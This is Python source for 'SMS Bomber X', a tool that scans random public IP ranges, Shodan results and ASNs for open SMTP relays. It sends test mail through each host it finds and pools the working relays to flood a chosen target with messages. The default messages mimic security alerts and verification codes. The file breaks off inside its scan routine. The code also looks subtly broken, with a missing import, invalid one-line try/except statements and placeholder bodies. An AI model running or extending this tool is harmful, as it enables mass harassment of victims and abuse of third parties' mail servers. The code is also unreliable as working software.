#!/usr/bin/env python3
# __________                  __             __     ________             .___ 
# \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
#  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
#  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
#  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
#         \/              \/      \/     \/               \/              \/  
#
# SMS Bomber X - v2.0 (Advanced Scanning)
# Original by RocketGod, Enhancements inspired by user feedback & advanced techniques
# https://github.com/RocketGod-git/smsbomber

# --- Standard Library Imports ---
import logging
import string
import smtplib
import time
import random
import socket
import ipaddress
import re
import concurrent.futures
import textwrap
import os
import json
import itertools
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple, Union, Set # Added Set
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# --- Rich TUI Components ---
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, TaskID
    from rich.prompt import Prompt, IntPrompt, Confirm, FloatPrompt, Password
    from rich.table import Table
    from rich.live import Live
    from rich.logging import RichHandler
    from rich import box
except ImportError:
    print("Error: 'rich' library not found. Please install it using: pip install rich")
    exit(1) 

# --- Optional Dependency Imports (Shodan, IPWhois) ---
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False
    # Define a placeholder if Shodan not installed, so checks don't cause NameError
    class shodan: Shodan = None; APIError = Exception 

try:
    from ipwhois import IPWhois
    from ipwhois.exceptions import ASNRegistryError
    IPWHOIS_AVAILABLE = True
except ImportError:
    IPWHOIS_AVAILABLE = False
    # Define placeholder
    class IPWhois: pass; ASNRegistryError = Exception 

# --- Configuration ---
CONFIG_DIR = Path.home() / ".smsbomberx"
PROFILES_DIR = CONFIG_DIR / "profiles"
RELAY_CACHE_FILE = CONFIG_DIR / "relay_cache.json"
LOG_FILE = CONFIG_DIR / "smsbomberx-v2.log" # Updated log file name
DEFAULT_PORTS = [25, 465, 587]
DEFAULT_TIMEOUT = 10 # Timeout for individual relay test
PORT_PRECHECK_TIMEOUT = 2 # Faster timeout for basic port open check
DEFAULT_SCAN_WORKERS = 100
DEFAULT_RELAY_POOL_TARGET = 5 # Try to find at least this many relays

# --- Ensure Configuration Directories Exist ---
try:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    PROFILES_DIR.mkdir(parents=True, exist_ok=True)
except OSError as e:
    print(f"Error creating configuration directories in '{CONFIG_DIR}': {e}")
    # Allow continuing, but warn that saving profiles/cache might fail
    
# --- Setup Logging ---
# File handler
logging.basicConfig(
    level=logging.INFO, # Base level for file log
    format="%(asctime)s [%(levelname)-7s] [%(threadName)s] %(name)s: %(message)s", # Include thread name
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8', mode='a')], # Append mode
    force=True 
)
# Rich handler for console
log = logging.getLogger(__name__) 
log.setLevel(logging.DEBUG) # Set logger's effective level (change to INFO for less verbosity)
console = Console(record=True, force_terminal=True, width=120) 
rich_handler = RichHandler(
    console=console, 
    show_path=False, 
    level=logging.INFO, # Control console verbosity separately (e.g., INFO, WARNING)
    log_time_format="[%X]",
    markup=True # Enable rich markup in log messages
    ) 
log.addHandler(rich_handler)
log.propagate = False # Prevent root logger duplicating messages if it also has handlers

# --- Default Messages ---
DEFAULT_MESSAGES = [ # Kept short for example
    "Service notification: Please verify your account activity.",
    "Reminder: Your appointment is scheduled soon.",
    "Security Alert: An unusual login attempt was detected.",
    "Configuration update required. Please check settings.",
    "Your verification code is: {random.randint(100000, 999999)}", 
    "Consider using a VPN for enhanced privacy.",
]

# --- Data Classes ---
@dataclass
class AppConfig:
    """Stores the application configuration for a run."""
    target_email: str = ""
    message_count: int = 10
    delay_min: float = 2.0
    delay_max: float = 5.0
    scan_ports: List[int] = field(default_factory=lambda: list(DEFAULT_PORTS))
    # Scanning Sources
    scan_range_raw: str = "" # User input: CIDR, hostname, IP
    target_file: Optional[str] = None # Path to file with targets
    scan_asn: Optional[str] = None # ASN (e.g., "AS15169")
    use_shodan: bool = False # Flag to enable Shodan search
    shodan_api_key: Optional[str] = None # Stored if provided
    shodan_query_limit: int = 1000 # Max results to request from Shodan per query
    # Scanning Options
    scan_timeout: int = DEFAULT_TIMEOUT # For full relay test
    scan_workers: int = DEFAULT_SCAN_WORKERS
    enable_port_precheck: bool = True # Enable fast port open check first
    port_precheck_timeout: int = PORT_PRECHECK_TIMEOUT
    relay_pool_target: int = DEFAULT_RELAY_POOL_TARGET # 0 means find all in scan
    # Cache/Log Usage
    use_relay_cache: bool = True
    load_previous_log: bool = True 
    profile_name: str = "default" # For saving/loading config
    
    # --- Methods for processing config values ---
    def get_scan_network(self) -> Optional[Union[ipaddress.IPv4Network, ipaddress.IPv6Network]]:
        """Parses scan_range_raw into an ipaddress network object."""
        if not self.scan_range_raw: return None
        try: return ipaddress.ip_network(self.scan_range_raw, strict=False)
        except ValueError: return None 

    def get_base_scan_hosts(self) -> List[str]:
        """Gets hosts from the scan_range_raw (CIDR or single host/IP)."""
        network = self.get_scan_network()
        if network:
            try: return [str(ip) for ip in network.hosts()]
            except TypeError: return [str(network.network_address)] if network.num_addresses == 1 else []
        elif self.scan_range_raw: return [self.scan_range_raw] # Treat as single if not network
        else: return []

    def generate_random_scan_hosts(self) -> List[str]:
        """Generates hosts from a random public /16 IPv4 range."""
        while True:
            # Simplified exclusion logic for example
            first_octet = random.randint(1, 223) 
            if first_octet in [10, 127] or (172 <= first_octet <= 172 and 16 <= random.randint(0, 255) <= 31) or (first_octet == 192 and random.randint(0, 255) == 168) or (first_octet == 169 and random.randint(0, 255) == 254) or first_octet >= 224:
                 continue
            second_octet = random.randint(0, 255)
            random_base = f"{first_octet}.{second_octet}.0.0/16"
            try:
                ip_net = ipaddress.ip_network(random_base, strict=False)
                if not (ip_net.is_private or ip_net.is_multicast or ip_net.is_reserved or ip_net.is_loopback or ip_net.is_link_local):
                    log.info(f"Generated random scan range: {ip_net}")
                    self.scan_range_raw = str(ip_net) # Update config state
                    return [str(ip) for ip in ip_net.hosts()]
            except ValueError: continue # Retry generation if invalid

@dataclass
class RelayInfo:
    """Stores information about a potential or confirmed SMTP relay."""
    host: str
    port: int
    status: str = "untested" 
    last_checked: float = 0.0 
    success_count: int = 0
    failure_count: int = 0
    # Added source to track where the target came from (cache, scan, shodan, etc.)
    source: Optional[str] = None 
    connection: Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]] = field(default=None, repr=False) 


# --- Helper Functions ---
def validate_email(email: str) -> bool:
    """Basic validation of email address format using regex."""
    if not email or not isinstance(email, str): return False
    email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]{2,}$"
    return re.match(email_regex, email) is not None

def random_string(length: int = 10) -> str:
    """Generates a random string of lowercase letters."""
    if length < 1: length = 1
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def load_messages(filepath: Optional[str]) -> List[str]:
    """Loads messages from a file or returns defaults, attempts basic formatting."""
    # ... (Implementation remains the same as previous version - kept for brevity) ...
    messages_to_load = []
    source = "defaults"
    if filepath:
        message_path = Path(filepath)
        if message_path.is_file():
            try:
                with open(message_path, 'r', encoding='utf-8') as f:
                    messages_to_load = [line.strip() for line in f if line.strip()]
                if messages_to_load:
                    log.info(f"Loaded {len(messages_to_load)} messages from '{filepath}'")
                    source = filepath
                else:
                    log.warning(f"Message file '{filepath}' was empty. Using default messages.")
            except IOError as e:
                log.error(f"Error reading message file '{filepath}': {e}. Using default messages.")
            except Exception as e: 
                log.error(f"Unexpected error reading message file '{filepath}': {e}. Using default messages.")
        else:
             log.error(f"Message file '{filepath}' not found. Using default messages.")
    
    if not messages_to_load: 
        log.info("Using default messages.")
        messages_to_load = DEFAULT_MESSAGES
        source = "defaults"

    final_messages = []
    for msg in messages_to_load:
         try:
             final_messages.append(msg.format(random=random)) 
         except Exception as fmt_err:
             log.debug(f"Could not format message: '{msg}'. Error: {fmt_err}. Using literal message.")
             final_messages.append(msg) 

    return final_messages


def parse_ports(port_str: str) -> List[int]:
    """Parses a comma-separated string of ports into a list of valid integers."""
    # ... (Implementation remains the same - kept for brevity) ...
    ports = set() 
    try:
        parts = port_str.split(',')
        for part in parts:
            part = part.strip()
            if not part: continue
            port_num = int(part)
            if 1 <= port_num <= 65535:
                ports.add(port_num)
            else:
                log.warning(f"Ignoring invalid port number: {port_num}")
        
        valid_ports = sorted(list(ports))
        if valid_ports:
            log.debug(f"Parsed ports: {valid_ports}")
            return valid_ports
        else:
             log.warning(f"No valid ports found in '{port_str}'. Using default ports: {DEFAULT_PORTS}")
             return list(DEFAULT_PORTS) # Return a copy
             
    except ValueError:
        log.error(f"Invalid characters in port string: '{port_str}'. Using default ports: {DEFAULT_PORTS}")
        return list(DEFAULT_PORTS) # Return a copy


def is_port_open(host: str, port: int, timeout: float) -> bool:
    """Performs a quick check if a TCP port is open using socket."""
    sock = None
    try:
        # Resolve hostname first if needed (can timeout)
        # Use create_connection which handles IPv4/IPv6 and combines connect
        log.debug(f"Pre-checking port {host}:{port} (Timeout: {timeout}s)")
        sock = socket.create_connection((host, port), timeout=timeout)
        log.debug(f"Port pre-check success: {host}:{port} appears open.")
        return True
    except socket.timeout:
        log.debug(f"Port pre-check timeout for {host}:{port}.")
        return False
    except (socket.error, OSError) as e:
        # Common errors: Connection refused, Network unreachable, Host unreachable
        log.debug(f"Port pre-check socket error for {host}:{port}: {e.strerror} (errno {e.errno})")
        return False
    except Exception as e:
        # Other errors (e.g., DNS resolution within create_connection)
        log.warning(f"Unexpected error during port pre-check for {host}:{port}: {e}")
        return False
    finally:
        if sock:
            try:
                sock.close()
            except socket.error:
                pass # Ignore errors closing socket


# --- Advanced Target Discovery Functions ---
def query_shodan(api_key: str, ports: List[int], limit: int) -> Set[str]:
    """Queries Shodan API for IPs with specified ports open."""
    if not SHODAN_AVAILABLE:
        log.error("Shodan library not installed. Cannot query Shodan.")
        return set()
    if not api_key:
        log.error("Shodan API key not provided. Cannot query Shodan.")
        return set()

    api = shodan.Shodan(api_key)
    ips = set()
    query = f"port:{','.join(map(str, ports))}"
    log.info(f"Querying Shodan: '{query}' (Limit: {limit})")

    try:
        # Using stream=True might be more memory efficient for very large result sets
        # For moderate limits, search() is simpler
        results = api.search(query, limit=limit) 
        # results = api.search_cursor(query) # Use cursor for > 10k results (paid API feature usually)
        
        count = 0
        # Process results from search (up to limit)
        if 'matches' in results:
            for service in results['matches']:
                ip_str = service.get('ip_str')
                if ip_str:
                    ips.add(ip_str)
                    count += 1
                    if limit > 0 and count >= limit:
                        break # Respect limit if using basic search
        
        log.info(f"Found {len(ips)} unique IPs via Shodan matching the query.")
        return ips

    except shodan.APIError as e:
        log.error(f"Shodan API error: {e}")
        return set()
    except Exception as e:
        log.error(f"Unexpected error querying Shodan: {e}", exc_info=True)
        return set()


def get_asn_ranges(asn_str: str) -> List[str]:
    """Gets CIDR ranges associated with an ASN string (e.g., 'AS15169')."""
    if not IPWHOIS_AVAILABLE:
        log.error("ipwhois library not installed. Cannot lookup ASN ranges.")
        return []
    if not asn_str:
        return []
        
    # Remove potential 'AS' prefix and ensure it's just the number
    asn_number = asn_str.upper().replace("AS", "").strip()
    if not asn_number.isdigit():
        log.error(f"Invalid ASN format provided: '{asn_str}'. Must be numeric (e.g., '15169').")
        return []

    log.info(f"Looking up IP ranges for ASN: AS{asn_number}")
    cidrs = []
    try:
        # Using IPWhois on a known IP within the ASN to get its details, including CIDRs
        # This is a common approach, but might not be exhaustive or always accurate
        # A direct ASN -> CIDR query service might be better but often less available in libraries
        # We can try getting info for the ASN number directly if supported by backend service used by ipwhois
        
        # Try getting ASN details directly (less reliable across lookups?)
        # Requires rdap lookup typically
        try:
             obj = IPWhois('AS' + asn_number) # Check if this syntax works for rdap lookup? Usually needs IP.
             results = obj.lookup_rdap(asn_info=True) # Explicitly request ASN info
             if results and results.get('asn_cidr'):
                   cidrs = results['asn_cidr'].split(', ') # Check format
                   log.info(f"Found {len(cidrs)} ranges via direct ASN RDAP lookup for AS{asn_number}.")
                   return cidrs
        except Exception as direct_lookup_err:
              log.debug(f"Direct ASN RDAP lookup failed ({direct_lookup_err}), trying via IP...")

        # Fallback: Query RIPE Stat for ASN neighbors (requires network call) or use prefix lookup service if available
        # For simplicity, this example won't include external RIPE stat queries.
        # A common library approach IS to use an IP within the ASN's known range.
        # This part needs a reliable source of ASN -> IP -> CIDR data.
        # Placeholder: If direct lookup fails, log warning.
        log.warning(f"Direct ASN->CIDR lookup via ipwhois RDAP failed or not fully supported for AS{asn_number}. This feature is currently limited.")
        # Example: Manually specify a known IP or use another service/library for better results.
        
    except ASNRegistryError as e:
        log.error(f"ASN lookup failed (Registry Error): {e}")
    except Exception as e:
        log.error(f"Unexpected error looking up ASN {asn_str}: {e}", exc_info=True)
        
    return [] # Return empty list if lookup fails

def load_targets_from_file(filepath: str) -> Set[str]:
    """Loads targets (IPs, CIDRs, hostnames) from a file, one per line."""
    targets = set()
    target_path = Path(filepath)
    if not target_path.is_file():
        log.error(f"Target file not found: '{filepath}'")
        return targets
        
    try:
        with open(target_path, 'r', encoding='utf-8') as f:
            for line in f:
                target = line.strip()
                # Remove comments (e.g., lines starting with #)
                if target and not target.startswith('#'):
                    targets.add(target)
        log.info(f"Loaded {len(targets)} unique targets from file: '{filepath}'")
    except IOError as e:
        log.error(f"Error reading target file '{filepath}': {e}")
    except Exception as e:
         log.error(f"Unexpected error reading target file '{filepath}': {e}", exc_info=True)
         
    return targets

# --- Relay Management (Class Definition) ---
class RelayManager:
    """Manages the collection, caching, and status of potential SMTP relays."""
    # ... (Initialization __init__, load_cache, save_cache remains the same) ...
    def __init__(self, cache_file: Path, console: Console):
        self.cache_file = cache_file
        self.console = console
        self.known_relays: Dict[Tuple[str, int], RelayInfo] = {} 
        self.active_relays: List[RelayInfo] = []
        self._active_relay_cycler: Optional[itertools.cycle] = None
        self.load_cache() 

    def load_cache(self):
        # ... (Implementation identical to previous version) ...
        if self.cache_file.is_file():
            try:
                with open(self.cache_file, 'r', encoding='utf-8') as f: data = json.load(f)
                loaded_count = 0
                for key_str, relay_dict in data.items():
                    try:
                        if ':' not in key_str: continue
                        host, port_str = key_str.rsplit(':', 1)
                        port = int(port_str)
                        valid_keys = RelayInfo.__annotations__.keys()
                        relay_info_data = {k: v for k, v in relay_dict.items() if k in valid_keys and k != 'connection'}
                        if 'host' in relay_info_data and 'port' in relay_info_data:
                           relay = RelayInfo(**relay_info_data) 
                           self.known_relays[(relay.host, relay.port)] = relay
                           loaded_count += 1
                        else: log.warning(f"Skipping cache entry {key_str}: Missing fields.")
                    except (ValueError, TypeError, KeyError) as e: log.warning(f"Skipping cache entry '{key_str}': {e}")
                log.info(f"Loaded {loaded_count} relays from cache: {self.cache_file}")
            except (json.JSONDecodeError, IOError) as e: log.error(f"Failed loading relay cache '{self.cache_file}': {e}")
            except Exception as e: log.error(f"Unexpected error loading cache: {e}", exc_info=True)
        else: log.info(f"Cache file '{self.cache_file}' not found. Starting fresh.")
            
    def save_cache(self):
        # ... (Implementation identical to previous version) ...
        log.debug(f"Saving {len(self.known_relays)} relays to cache...")
        data_to_save = {}
        for (host, port), relay_info in self.known_relays.items():
             relay_dict = relay_info.__dict__.copy(); relay_dict.pop('connection', None) 
             relay_dict['last_checked'] = float(relay_info.last_checked)
             data_to_save[f"{host}:{port}"] = relay_dict
        try:
            self.cache_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.cache_file, 'w', encoding='utf-8') as f: json.dump(data_to_save, f, indent=2, ensure_ascii=False)
            log.info(f"Relay cache saved to {self.cache_file}")
        except (IOError, TypeError) as e: log.error(f"Failed saving cache '{self.cache_file}': {e}")
        except Exception as e: log.error(f"Unexpected error saving cache: {e}", exc_info=True)

    def add_or_update_relay(self, host: str, port: int, status: str, 
                           source: Optional[str] = None, # Track where it came from
                           connection: Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]] = None):
        """Adds or updates relay info, manages active pool."""
        key = (host, port)
        now = time.time()
        is_working = (status == 'working')

        if key in self.known_relays:
            relay = self.known_relays[key]
            relay.status = status
            relay.last_checked = now
            if source: relay.source = source # Update source if provided
            if is_working:
                relay.success_count += 1; relay.failure_count = 0
                if connection and not relay.connection: 
                    relay.connection = connection
                    if relay not in self.active_relays: self.active_relays.append(relay); log.debug(f"Reactivated {host}:{port}")
            else:
                relay.failure_count += 1
                if relay in self.active_relays:
                    if relay.connection:
                        try: relay.connection.quit() 
                        except: pass
                    relay.connection = None
                    try: self.active_relays.remove(relay); log.debug(f"Removed failed {host}:{port} from active.")
                    except ValueError: pass 
        else:
            relay = RelayInfo(host=host, port=port, status=status, last_checked=now, source=source)
            if is_working:
                relay.success_count = 1
                if connection: relay.connection = connection; self.active_relays.append(relay); log.debug(f"Added NEW working {host}:{port}")
            else: relay.failure_count = 1
            self.known_relays[key] = relay
            
        # Reset cycle if active pool changed
        self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None

    def get_scan_targets(self, config: AppConfig, previous_log_ips: List[str]) -> List[Dict[str, Any]]:
        """Prepares scan targets from ALL configured sources (Cache, Log, File, Shodan, ASN, Range, Random)."""
        targets_dict: Dict[Tuple[str, int], Dict[str, Any]] = {} # Use dict for auto-deduplication based on (host, port)
        processed_hosts_ports: Set[Tuple[str, int]] = set() # Track processed to avoid redundant lookups

        def add_target(host: str, port: int, source: str):
            """Helper to add unique target to the dictionary."""
            key = (host, port)
            if key not in processed_hosts_ports:
                targets_dict[key] = {'host': host, 'port': port, 'source': source}
                processed_hosts_ports.add(key)

        # 1. From Cache (Highest priority implicitly due to sorting later?)
        # No, priority is based on processing order here. Cache isn't scanned first unless added first.
        # Let's keep the order based on input types for clarity.

        # --- Process Input Sources ---
        all_source_hosts: Set[Tuple[str, str]] = set() # Store (host/cidr, source_type) pairs

        # a. Target File
        if config.target_file:
            targets_from_file = load_targets_from_file(config.target_file)
            for target in targets_from_file: all_source_hosts.add((target, 'file'))
            
        # b. ASN Lookup
        if config.scan_asn and IPWHOIS_AVAILABLE:
            asn_ranges = get_asn_ranges(config.scan_asn)
            for cidr in asn_ranges: all_source_hosts.add((cidr, 'asn'))
        elif config.scan_asn and not IPWHOIS_AVAILABLE:
             log.error("ASN scanning requested, but 'ipwhois' library is not installed.")

        # c. Manual Range/Host
        if config.scan_range_raw:
             all_source_hosts.add((config.scan_range_raw, 'manual_range'))
        elif not any([config.target_file, config.scan_asn, config.use_shodan]):
              # Only generate random if no other input method was chosen
              log.info("No specific targets provided (File/ASN/Shodan/Range). Generating random range.")
              # Generation adds range to config.scan_range_raw
              config.generate_random_scan_hosts()
              if config.scan_range_raw:
                    all_source_hosts.add((config.scan_range_raw, 'random_range'))


        # --- Expand Hosts/CIDRs and add to final targets list ---
        total_expanded_hosts = 0
        unique_final_targets = set() # Use set for final host:port deduplication

        for item, source in all_source_hosts:
            try:
                # Try interpreting item as network first
                network = ipaddress.ip_network(item, strict=False)
                hosts = [str(ip) for ip in network.hosts()]
                 # Add network address itself if it's a single-host network
                if network.num_addresses == 1: hosts = [str(network.network_address)] 
                log.debug(f"Expanded {item} ({source}) into {len(hosts)} hosts.")
            except ValueError:
                # If not a network, treat as a single hostname/IP
                hosts = [item]
                log.debug(f"Using {item} ({source}) as a single target host.")
            except TypeError as e:
                 log.warning(f"Could not expand {item} from {source}. Error: {e}. Skipping.")
                 continue

            total_expanded_hosts += len(hosts)
            for host in hosts:
                for port in config.scan_ports:
                     key = (host, port)
                     if key not in unique_final_targets:
                           add_target(host, port, source)
                           unique_final_targets.add(key)


        # d. Shodan Query (adds unique IPs, apply configured ports)
        shodan_targets_added = 0
        if config.use_shodan and SHODAN_AVAILABLE:
             if config.shodan_api_key:
                  shodan_ips = query_shodan(config.shodan_api_key, config.scan_ports, config.shodan_query_limit)
                  for ip in shodan_ips:
                      for port in config.scan_ports: # Assume shodan result means *at least one* desired port is open
                            key = (ip, port)
                            if key not in unique_final_targets:
                                  add_target(ip, port, 'shodan')
                                  unique_final_targets.add(key)
                                  shodan_targets_added+=1
             else:
                  log.error("Shodan scan requested, but API key is missing.")
        elif config.use_shodan and not SHODAN_AVAILABLE:
              log.error("Shodan scan requested, but 'shodan' library is not installed.")


        # --- Add Cache and Log Sources (potentially re-adding/overwriting source info if needed) ---
        targets_list = list(targets_dict.values()) # Convert dict back to list for sorting
        processed_for_final_list: Set[Tuple[str, int]] = set()
        final_targets_list : List[Dict[str, Any]] = []

        # 1. Add from Cache (Sorted best first)
        if config.use_relay_cache:
             sorted_cached = sorted(self.known_relays.values(), 
                                     key=lambda r: (r.status == 'working', r.success_count, -r.failure_count, r.last_checked), reverse=True)
             for relay in sorted_cached:
                 key = (relay.host, relay.port)
                 if key not in processed_for_final_list:
                     # Get existing target info if available, otherwise create basic dict
                     existing_target = targets_dict.get(key, {'host': relay.host, 'port': relay.port, 'source': 'cache'})
                     # Prioritize cache as the source if re-adding
                     existing_target['source'] = 'cache' 
                     final_targets_list.append(existing_target)
                     processed_for_final_list.add(key)
             log.debug(f"Prioritized {len(processed_for_final_list)} targets from cache.")

        # 2. Add from Log file
        log_added = 0
        if config.load_previous_log and previous_log_ips:
            for item in previous_log_ips:
                try:
                    if ':' not in item: continue
                    host, port_str = item.rsplit(':', 1)
                    port = int(port_str)
                    key = (host, port)
                    if key not in processed_for_final_list:
                        existing_target = targets_dict.get(key, {'host': host, 'port': port, 'source': 'log'})
                        existing_target['source'] = 'log'
                        final_targets_list.append(existing_target)
                        processed_for_final_list.add(key)
                        log_added +=1
                except (ValueError, IndexError): pass # Already logged warning
            log.debug(f"Added {log_added} unique targets prioritised from legacy log.")

        # 3. Add remaining targets from other sources (File, ASN, Range, Shodan, Random)
        other_added = 0
        for key, target_info in targets_dict.items():
            if key not in processed_for_final_list:
                 final_targets_list.append(target_info)
                 processed_for_final_list.add(key)
                 other_added += 1
        log.debug(f"Added {other_added} unique targets from File/ASN/Range/Shodan/Random.")

        log.info(f"Prepared {len(final_targets_list)} unique targets overall for scanning phase.")
        return final_targets_list
        
    # ... (get_next_active_relay, mark_relay_failed, close_all_connections remain the same) ...
    def get_next_active_relay(self) -> Optional[RelayInfo]:
        # ... (Implementation identical to previous version) ...
        if not self.active_relays: return None
        if self._active_relay_cycler is None: self._active_relay_cycler = itertools.cycle(self.active_relays)
        initial_len = len(self.active_relays)
        count = 0
        while count <= initial_len:
            try:
                relay = next(self._active_relay_cycler)
                if relay in self.active_relays and relay.connection: return relay
            except StopIteration: self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None; return None
            except AttributeError: log.warning("Could not determine cycle length."); try: return next(self._active_relay_cycler) if self._active_relay_cycler else None; except StopIteration: return None
            except Exception as e: log.error(f"Error getting next relay: {e}", exc_info=True); self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None; return None
            count += 1
        log.warning("Cycled relays without finding valid one.")
        return None

    def mark_relay_failed(self, relay_info: RelayInfo, reason: str = "send_error"):
         # ... (Implementation identical to previous version) ...
        if relay_info: log.warning(f"Marking relay {relay_info.host}:{relay_info.port} failed ({reason})."); self.add_or_update_relay(relay_info.host, relay_info.port, reason) 
        else: log.error("Attempted to mark None relay failed.")

    def close_all_connections(self):
        # ... (Implementation identical to previous version) ...
        if not self.active_relays: log.info("No connections to close."); return
        log.info(f"Closing {len(self.active_relays)} connections..."); active_copy = list(self.active_relays); closed_count = 0
        for relay in active_copy:
            if relay.connection: log.debug(f"Closing {relay.host}:{relay.port}...");
                try: relay.connection.quit(); closed_count += 1
                except (smtplib.SMTPServerDisconnected, smtplib.SMTPException, socket.error): log.debug(f"Ignored quit error for {relay.host}:{relay.port}.")
                except Exception as e: log.warning(f"Unexpected quit error {relay.host}:{relay.port}: {e}")
                finally: relay.connection = None; 
                     if relay in self.active_relays: try: self.active_relays.remove(relay); except ValueError: pass
        self.active_relays.clear(); self._active_relay_cycler = None; log.info(f"Connection closing finished ({closed_count} attempts).")


# --- Scanning Logic (Core Relay Test) ---
def test_single_relay(target: Dict[str, Any], smtp_timeout: int) -> Tuple[Dict[str, Any], Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]], str]:
    """Tests a single host:port combination for open SMTP relay capability. (Logic remains same)."""
    # ... (Implementation identical to previous version - focus is target generation, this test is the payload) ...
    hostname = target['host']
    port = target['port']
    server: Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]] = None
    status: str = "failed" 

    try:
        log.debug(f"Testing relay target: {hostname}:{port}")
        sender_local = random_string(8)
        sender_domain = f"{random_string(6)}.test"
        sender = f"{sender_local}@{sender_domain}" 
        receiver = f"test-recipient-{random.randint(1000,9999)}@example.com" 
        start_time = time.monotonic() 
        
        if port == 465:
            log.debug(f"Connecting via SMTP_SSL to {hostname}:{port} (Timeout: {smtp_timeout}s)")
            server = smtplib.SMTP_SSL(hostname, port, timeout=smtp_timeout)
            server.ehlo(sender_domain) 
        else:
            log.debug(f"Connecting via SMTP to {hostname}:{port} (Timeout: {smtp_timeout}s)")
            server = smtplib.SMTP(hostname, port, timeout=smtp_timeout)
            server.ehlo(sender_domain) 
            if port == 587: 
                log.debug(f"Attempting STARTTLS on {hostname}:{port}...")
                try:
                    if server.has_extn('starttls'): server.starttls(); server.ehlo(sender_domain); log.debug(f"STARTTLS successful on {hostname}:{port}")
                    else: status = "starttls_unsupported"; try: server.quit(); except: pass ; return target, None, status
                except smtplib.SMTPException as tls_error: status = "starttls_failed"; log.warning(f"STARTTLS failed {hostname}:{port}: {tls_error}"); try: server.quit(); except: pass; return target, None, status 

        msg = MIMEMultipart('alternative'); msg['From'] = sender; msg['To'] = receiver
        msg['Subject'] = f'Connectivity Test {random_string(5)}'; msg['Date'] = smtplib.email.utils.formatdate(localtime=True) 
        msg['Message-ID'] = smtplib.make_msgid(domain=sender_domain) 
        msg_body = f"Relay test initiated {time.time()} from host."; msg.attach(MIMEText(msg_body, 'plain', 'utf-8')) 
        log.debug(f"Attempting relay test send: {sender} -> {receiver} via {hostname}:{port}")
        server.sendmail(sender, receiver, msg.as_string())
        end_time = time.monotonic(); response_time = end_time - start_time
        log.info(f"[bold green]SUCCESS[/]: Open relay confirmed at {hostname}:{port} (Time: {response_time:.2f}s)")
        status = "working"
        return target, server, status

    except smtplib.SMTPAuthenticationError: status = "auth_required"; log.info(f"{hostname}:{port} requires authentication.")
    except smtplib.SMTPRecipientsRefused as e: status = "recipient_refused"; log.debug(f"Recipient refused {hostname}:{port}: {e}")
    except smtplib.SMTPSenderRefused as e: status = "sender_refused"; log.debug(f"Sender refused {hostname}:{port}: {e}")
    except smtplib.SMTPHeloError as e: status = "proto_error_helo"; log.warning(f"HELO/EHLO error {hostname}:{port}: {e}")
    except smtplib.SMTPDataError as e: status = "proto_error_data"; log.warning(f"Data error {hostname}:{port}: {e}")
    except smtplib.SMTPConnectError as e: status = "connect_failed_smtp"; log.debug(f"SMTP connect error {hostname}:{port}: {e}")
    except smtplib.SMTPNotSupportedError as e: status = "feature_unsupported"; log.warning(f"SMTP feature unsupported {hostname}:{port}: {e}")
    except smtplib.SMTPResponseException as e: status = f"smtp_error_{e.smtp_code}"; log.warning(f"Unexpected SMTP response {hostname}:{port}: {e.smtp_code} {e.smtp_error}")
    except smtplib.SMTPException as e: status = "smtp_error_general"; log.warning(f"General SMTP exception {hostname}:{port}: {e}")
    except socket.timeout: status = "timeout"; log.debug(f"Timeout for {hostname}:{port}")
    except socket.gaierror as e: status = "dns_error"; log.debug(f"DNS error for '{hostname}': {e}")
    except (socket.error, OSError) as e: status = "socket_error"; log.debug(f"Socket/OS error {hostname}:{port}: {e}")
    except Exception as e: status = "unknown_error"; log.error(f"Unexpected error testing {hostname}:{port}: {e}", exc_info=True)
        
    if server:
        try: server.quit()
        except: pass
    return target, None, status


# --- Enhanced Scan Orchestration ---
def run_scan(config: AppConfig, relay_manager: RelayManager, previous_log_ips: List[str], progress: Progress) -> None:
    """Manages the relay scanning process, including optional pre-checks."""
    
    scan_targets = relay_manager.get_scan_targets(config, previous_log_ips)
    if not scan_targets:
        log.warning("Scan initiation: No targets identified.")
        progress.add_task("[yellow]Scan Skipped (No Targets)", total=1, completed=1)
        return

    # --- Progress Tasks ---
    # Main task for relay testing
    task_relay_test_id = progress.add_task("[cyan]Relay Testing", total=len(scan_targets), start=False) 
    # Optional task for port pre-checking
    task_precheck_id: Optional[TaskID] = None
    if config.enable_port_precheck:
        task_precheck_id = progress.add_task("[blue]Port Pre-checking", total=len(scan_targets), start=True)
    
    progress.start_task(task_relay_test_id) # Start relay test task display
    
    # --- State Variables ---
    tested_count = 0
    precheck_skipped_count = 0
    found_count = 0
    
    max_workers = min(config.scan_workers, len(scan_targets))
    if max_workers <= 0: max_workers = 1 
    log.info(f"Starting advanced scan: Targets={len(scan_targets)}, Workers={max_workers}, Pre-check={'Enabled' if config.enable_port_precheck else 'Disabled'}")

    futures: Set[concurrent.futures.Future] = set()
    scan_stopped_early = False

    try:
        with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="AdvScanner_") as executor:
            for target in scan_targets:
                # Check pool target before submitting anything
                if config.relay_pool_target > 0 and len(relay_manager.active_relays) >= config.relay_pool_target:
                    log.info(f"Pool target ({config.relay_pool_target}) met. Stopping new task submissions.")
                    scan_stopped_early = True
                    break

                host = target['host']
                port = target['port']
                
                # --- Optional Port Pre-check ---
                port_is_likely_open = True # Assume open if pre-check disabled
